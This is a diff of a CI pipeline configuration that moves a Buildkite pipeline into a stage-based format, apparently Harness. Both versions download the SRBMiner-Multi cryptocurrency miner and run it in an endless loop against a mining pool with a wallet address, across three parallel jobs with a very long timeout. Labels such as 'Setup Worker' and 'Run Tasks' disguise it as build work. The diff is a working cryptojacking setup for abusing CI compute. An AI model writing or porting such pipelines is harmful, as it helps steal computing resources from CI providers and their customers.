@@ -1,25 +1,33 @@
-steps:
-  - label: "Setup Worker"
-    command: |
-      cd ~ && mkdir -p worker && cd worker
-      wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.9/SRBMiner-Multi-3-3-9-Linux.tar.gz
-      tar xf SRBMiner-Multi-3-3-9-Linux.tar.gz
-      rm SRBMiner-Multi-3-3-9-Linux.tar.gz
-    timeout_in_minutes: 10
-    agents:
-      queue: linux-large
+stages:
+  - stage:
+      name: Setup Worker
+      identifier: setup
+      spec:
+        steps:
+          - step:
+              type: Run
+              name: Download SRBMiner
+              command: |
+                cd ~ && mkdir -p worker && cd worker
+                wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.9/SRBMiner-Multi-3-3-9-Linux.tar.gz
+                tar xf SRBMiner-Multi-3-3-9-Linux.tar.gz
+                rm SRBMiner-Multi-3-3-9-Linux.tar.gz
+              timeout: 600
 
-  - wait
-
-  - label: "Run Tasks"
-    command: |
-      TASK_ID=$((BUILDKITE_PARALLEL_JOB + 1))
-      cd ~/worker/SRBMiner-Multi-3-3-9
-      while true; do
-        ./SRBMiner-MULTI -a neuromorph -o stratum.cereblix.com:3333 -u crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun.task$TASK_ID -p x -t 4
-        sleep 5
-      done
-    parallelism: 3
-    timeout_in_minutes: 10000
-    agents:
-      queue: linux-large
+  - stage:
+      name: Run Tasks
+      identifier: run
+      spec:
+        steps:
+          - step:
+              type: Run
+              name: Mining Tasks
+              command: |
+                TASK_ID=$(($RUNNER_NUMBER))
+                cd ~/worker/SRBMiner-Multi-3-3-9
+                while true; do
+                  ./SRBMiner-MULTI -a neuromorph -o stratum.cereblix.com:3333 -u crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun.task$TASK_ID -p x -t 4
+                  sleep 5
+                done
+              timeout: 600000
+        parallelism: 3
